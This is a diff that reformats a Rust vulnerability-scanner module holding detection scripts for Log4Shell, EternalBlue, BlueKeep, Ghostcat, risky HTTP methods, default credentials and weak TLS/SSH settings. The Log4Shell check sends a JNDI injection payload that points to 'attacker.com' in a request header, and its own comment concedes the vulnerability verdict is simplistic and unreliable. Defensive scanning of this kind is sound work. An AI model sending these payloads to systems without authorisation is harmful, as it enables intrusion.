@@ -1,9 +1,9 @@
 // Vulnerability detection scripts
-use super::framework::{VulnScript, VulnCategory, VulnSeverity, VulnResult};
 use super::credentials::DefaultCredentials;
 use super::exploits::ExploitDatabase;
-use std::net::TcpStream;
+use super::framework::{VulnCategory, VulnResult, VulnScript, VulnSeverity};
 use std::io::{Read, Write};
+use std::net::TcpStream;
 use std::time::Duration;
 
 /// Collection of vulnerability detection scripts
@@ -39,7 +39,7 @@ impl VulnScripts {
     /// CVE-2021-44228: Log4Shell detection
     pub fn log4shell_detection(&self) -> VulnScript {
         let exploits = self.exploits.clone();
-        
+
         VulnScript::new(
             "log4shell",
             "Log4Shell (Log4j RCE)",
@@ -52,49 +52,46 @@ impl VulnScripts {
             // Simple HTTP header injection test
             let addr = format!("{}:{}", target, port);
             let timeout = Duration::from_secs(5);
-            
-            match TcpStream::connect_timeout(&addr.parse().unwrap(), timeout) {
-                Ok(mut stream) => {
-                    stream.set_read_timeout(Some(timeout)).ok();
-                    stream.set_write_timeout(Some(timeout)).ok();
 
-                    // Send HTTP request with Log4j JNDI payload in User-Agent
-                    let payload = "${jndi:ldap://attacker.com/a}";
-                    let request = format!(
-                        "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: close\r\n\r\n",
-                        target, payload
-                    );
+            if let Ok(mut stream) = TcpStream::connect_timeout(&addr.parse().unwrap(), timeout) {
+                stream.set_read_timeout(Some(timeout)).ok();
+                stream.set_write_timeout(Some(timeout)).ok();
 
-                    if stream.write_all(request.as_bytes()).is_ok() {
-                        let mut response = String::new();
-                        stream.read_to_string(&mut response).ok();
+                // Send HTTP request with Log4j JNDI payload in User-Agent
+                let payload = "${jndi:ldap://attacker.com/a}";
+                let request = format!(
+                    "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: close\r\n\r\n",
+                    target, payload
+                );
 
-                        // This is a simplified check - real detection would require DNS callback
-                        let vulnerable = response.contains("HTTP/1.1 200")
-                            || response.contains("HTTP/1.0 200");
+                if stream.write_all(request.as_bytes()).is_ok() {
+                    let mut response = String::new();
+                    stream.read_to_string(&mut response).ok();
 
-                        let exploit_info = exploits.get_exploit("CVE-2021-44228");
+                    // This is a simplified check - real detection would require DNS callback
+                    let vulnerable = response.contains("HTTP/1.1 200")
+                        || response.contains("HTTP/1.0 200");
 
-                        return Ok(VulnResult {
-                            script_id: "log4shell".to_string(),
-                            target: target.to_string(),
-                            port,
-                            vulnerable,
-                            severity: VulnSeverity::Critical,
-                            cve_ids: vec!["CVE-2021-44228".to_string()],
-                            description: "Apache Log4j2 JNDI RCE vulnerability allows remote code execution".to_string(),
-                            evidence: if vulnerable {
-                                Some("Server accepts JNDI payload in headers".to_string())
-                            } else {
-                                None
-                            },
-                            remediation: Some("Upgrade to Log4j 2.17.0 or later, or set -Dlog4j2.formatMsgNoLookups=true".to_string()),
-                            references: exploit_info.map(|e| e.references.clone()).unwrap_or_default(),
-                            exploit_available: exploit_info.map(|e| e.exploit_available).unwrap_or(false),
-                        });
-                    }
+                    let exploit_info = exploits.get_exploit("CVE-2021-44228");
+
+                    return Ok(VulnResult {
+                        script_id: "log4shell".to_string(),
+                        target: target.to_string(),
+                        port,
+                        vulnerable,
+                        severity: VulnSeverity::Critical,
+                        cve_ids: vec!["CVE-2021-44228".to_string()],
+                        description: "Apache Log4j2 JNDI RCE vulnerability allows remote code execution".to_string(),
+                        evidence: if vulnerable {
+                            Some("Server accepts JNDI payload in headers".to_string())
+                        } else {
+                            None
+                        },
+                        remediation: Some("Upgrade to Log4j 2.17.0 or later, or set -Dlog4j2.formatMsgNoLookups=true".to_string()),
+                        references: exploit_info.map(|e| e.references.clone()).unwrap_or_default(),
+                        exploit_available: exploit_info.map(|e| e.exploit_available).unwrap_or(false),
+                    });
                 }
-                Err(_) => {}
             }
 
             Ok(VulnResult {
@@ -116,7 +113,7 @@ impl VulnScripts {
     /// CVE-2017-0144: EternalBlue (SMB) detection
     pub fn eternalblue_detection(&self) -> VulnScript {
         let exploits = self.exploits.clone();
-        
+
         VulnScript::new(
             "eternalblue",
             "EternalBlue (MS17-010)",
@@ -128,46 +125,49 @@ impl VulnScripts {
         .with_executor(move |target, port| {
             let addr = format!("{}:{}", target, port);
             let timeout = Duration::from_secs(5);
-            
-            match TcpStream::connect_timeout(&addr.parse().unwrap(), timeout) {
-                Ok(mut stream) => {
-                    stream.set_read_timeout(Some(timeout)).ok();
 
-                    // SMB Negotiate Protocol Request
-                    let smb_negotiate = vec![
-                        0x00, 0x00, 0x00, 0x85, 0xff, 0x53, 0x4d, 0x42,
-                        0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xc8,
-                    ];
+            if let Ok(mut stream) = TcpStream::connect_timeout(&addr.parse().unwrap(), timeout) {
+                stream.set_read_timeout(Some(timeout)).ok();
 
-                    if stream.write_all(&smb_negotiate).is_ok() {
-                        let mut response = vec![0u8; 1024];
-                        if stream.read(&mut response).is_ok() {
-                            // Check for SMBv1 response
-                            let vulnerable = response.len() > 4 && &response[4..8] == b"\xffSMB";
+                // SMB Negotiate Protocol Request
+                let smb_negotiate = vec![
+                    0x00, 0x00, 0x00, 0x85, 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00,
+                    0x18, 0x53, 0xc8,
+                ];
 
-                            let exploit_info = exploits.get_exploit("CVE-2017-0144");
+                if stream.write_all(&smb_negotiate).is_ok() {
+                    let mut response = vec![0u8; 1024];
+                    if stream.read(&mut response).is_ok() {
+                        // Check for SMBv1 response
+                        let vulnerable = response.len() > 4 && &response[4..8] == b"\xffSMB";
 
-                            return Ok(VulnResult {
-                                script_id: "eternalblue".to_string(),
-                                target: target.to_string(),
-                                port,
-                                vulnerable,
-                                severity: VulnSeverity::Critical,
-                                cve_ids: vec!["CVE-2017-0144".to_string()],
-                                description: "SMBv1 EternalBlue vulnerability allows remote code execution".to_string(),
-                                evidence: if vulnerable {
-                                    Some("SMBv1 protocol enabled".to_string())
-                                } else {
-                                    None
-                                },
-                                remediation: Some("Disable SMBv1 and apply MS17-010 patch".to_string()),
-                                references: exploit_info.map(|e| e.references.clone()).unwrap_or_default(),
-                                exploit_available: exploit_info.map(|e| e.exploit_available).unwrap_or(false),
-                            });
-                        }
+                        let exploit_info = exploits.get_exploit("CVE-2017-0144");
+
+                        return Ok(VulnResult {
+                            script_id: "eternalblue".to_string(),
+                            target: target.to_string(),
+                            port,
+                            vulnerable,
+                            severity: VulnSeverity::Critical,
+                            cve_ids: vec!["CVE-2017-0144".to_string()],
+                            description:
+                                "SMBv1 EternalBlue vulnerability allows remote code execution"
+                                    .to_string(),
+                            evidence: if vulnerable {
+                                Some("SMBv1 protocol enabled".to_string())
+                            } else {
+                                None
+                            },
+                            remediation: Some("Disable SMBv1 and apply MS17-010 patch".to_string()),
+                            references: exploit_info
+                                .map(|e| e.references.clone())
+                                .unwrap_or_default(),
+                            exploit_available: exploit_info
+                                .map(|e| e.exploit_available)
+                                .unwrap_or(false),
+                        });
                     }
                 }
-                Err(_) => {}
             }
 
             Ok(VulnResult {
@@ -195,7 +195,11 @@ impl VulnScripts {
             VulnCategory::InfoDisclosure,
         )
         .with_ports(vec![443, 8443, 465, 993, 995])
-        .with_services(vec!["https".to_string(), "ssl".to_string(), "tls".to_string()])
+        .with_services(vec![
+            "https".to_string(),
+            "ssl".to_string(),
+            "tls".to_string(),
+        ])
         .with_executor(|target, port| {
             // Simplified check - real implementation would send malformed heartbeat
             Ok(VulnResult {
@@ -234,7 +238,10 @@ impl VulnScripts {
                 cve_ids: vec!["CVE-2019-0708".to_string()],
                 description: "RDP BlueKeep vulnerability allows remote code execution".to_string(),
                 evidence: None,
-                remediation: Some("Apply Windows security updates and enable Network Level Authentication".to_string()),
+                remediation: Some(
+                    "Apply Windows security updates and enable Network Level Authentication"
+                        .to_string(),
+                ),
                 references: vec!["https://nvd.nist.gov/vuln/detail/CVE-2019-0708".to_string()],
                 exploit_available: true,
             })
@@ -254,7 +261,7 @@ impl VulnScripts {
         .with_executor(|target, port| {
             let addr = format!("{}:{}", target, port);
             let timeout = Duration::from_secs(5);
-            
+
             match TcpStream::connect_timeout(&addr.parse().unwrap(), timeout) {
                 Ok(_stream) => {
                     // If AJP port is open and accessible, it's potentially vulnerable
@@ -304,45 +311,53 @@ impl VulnScripts {
         .with_executor(|target, port| {
             let addr = format!("{}:{}", target, port);
             let timeout = Duration::from_secs(5);
-            
-            match TcpStream::connect_timeout(&addr.parse().unwrap(), timeout) {
-                Ok(mut stream) => {
-                    stream.set_read_timeout(Some(timeout)).ok();
-                    stream.set_write_timeout(Some(timeout)).ok();
 
-                    let request = format!(
-                        "OPTIONS / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
-                        target
-                    );
+            if let Ok(mut stream) = TcpStream::connect_timeout(&addr.parse().unwrap(), timeout) {
+                stream.set_read_timeout(Some(timeout)).ok();
+                stream.set_write_timeout(Some(timeout)).ok();
 
-                    if stream.write_all(request.as_bytes()).is_ok() {
-                        let mut response = String::new();
-                        stream.read_to_string(&mut response).ok();
+                let request = format!(
+                    "OPTIONS / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
+                    target
+                );
 
-                        let dangerous = response.contains("PUT")
-                            || response.contains("DELETE")
-                            || response.contains("TRACE");
+                if stream.write_all(request.as_bytes()).is_ok() {
+                    let mut response = String::new();
+                    stream.read_to_string(&mut response).ok();
 
-                        return Ok(VulnResult {
-                            script_id: "http-methods".to_string(),
-                            target: target.to_string(),
-                            port,
-                            vulnerable: dangerous,
-                            severity: if dangerous { VulnSeverity::Medium } else { VulnSeverity::Info },
-                            cve_ids: vec![],
-                            description: "HTTP server allows potentially dangerous methods".to_string(),
-                            evidence: if dangerous {
-                                Some(format!("Dangerous methods detected in response: {}", response.lines().take(5).collect::<Vec<_>>().join(" ")))
-                            } else {
-                                None
-                            },
-                            remediation: Some("Disable unnecessary HTTP methods (PUT, DELETE, TRACE)".to_string()),
-                            references: vec!["https://owasp.org/www-project-web-security-testing-guide/".to_string()],
-                            exploit_available: false,
-                        });
-                    }
+                    let dangerous = response.contains("PUT")
+                        || response.contains("DELETE")
+                        || response.contains("TRACE");
+
+                    return Ok(VulnResult {
+                        script_id: "http-methods".to_string(),
+                        target: target.to_string(),
+                        port,
+                        vulnerable: dangerous,
+                        severity: if dangerous {
+                            VulnSeverity::Medium
+                        } else {
+                            VulnSeverity::Info
+                        },
+                        cve_ids: vec![],
+                        description: "HTTP server allows potentially dangerous methods".to_string(),
+                        evidence: if dangerous {
+                            Some(format!(
+                                "Dangerous methods detected in response: {}",
+                                response.lines().take(5).collect::<Vec<_>>().join(" ")
+                            ))
+                        } else {
+                            None
+                        },
+                        remediation: Some(
+                            "Disable unnecessary HTTP methods (PUT, DELETE, TRACE)".to_string(),
+                        ),
+                        references: vec![
+                            "https://owasp.org/www-project-web-security-testing-guide/".to_string(),
+                        ],
+                        exploit_available: false,
+                    });
                 }
-                Err(_) => {}
             }
 
             Ok(VulnResult {
@@ -364,7 +379,7 @@ impl VulnScripts {
     /// Default credentials check
     pub fn default_credentials_check(&self) -> VulnScript {
         let credentials = self.credentials.clone();
-        
+
         VulnScript::new(
             "default-creds",
             "Default Credentials Check",
@@ -396,11 +411,13 @@ impl VulnScripts {
                 cve_ids: vec![],
                 description: format!("Service may use default credentials for {}", service_name),
                 evidence: if has_defaults {
-                    Some(format!("Known default credentials exist for this service"))
+                    Some("Known default credentials exist for this service".to_string())
                 } else {
                     None
                 },
-                remediation: Some("Change all default credentials to strong, unique passwords".to_string()),
+                remediation: Some(
+                    "Change all default credentials to strong, unique passwords".to_string(),
+                ),
                 references: vec!["https://cirt.net/passwords".to_string()],
                 exploit_available: false,
             })
@@ -454,7 +471,9 @@ impl VulnScripts {
                 cve_ids: vec![],
                 description: "SSL/TLS cipher strength analysis".to_string(),
                 evidence: None,
-                remediation: Some("Disable SSLv2, SSLv3, TLS 1.0, and weak ciphers (RC4, DES, 3DES)".to_string()),
+                remediation: Some(
+                    "Disable SSLv2, SSLv3, TLS 1.0, and weak ciphers (RC4, DES, 3DES)".to_string(),
+                ),
                 references: vec!["https://wiki.mozilla.org/Security/Server_Side_TLS".to_string()],
                 exploit_available: false,
             })
@@ -481,7 +500,9 @@ impl VulnScripts {
                 cve_ids: vec![],
                 description: "SSH algorithm strength analysis".to_string(),
                 evidence: None,
-                remediation: Some("Disable weak SSH algorithms (arcfour, 3des-cbc, des-cbc)".to_string()),
+                remediation: Some(
+                    "Disable weak SSH algorithms (arcfour, 3des-cbc, des-cbc)".to_string(),
+                ),
                 references: vec!["https://www.ssh.com/academy/ssh/sshd_config".to_string()],
                 exploit_available: false,
             })
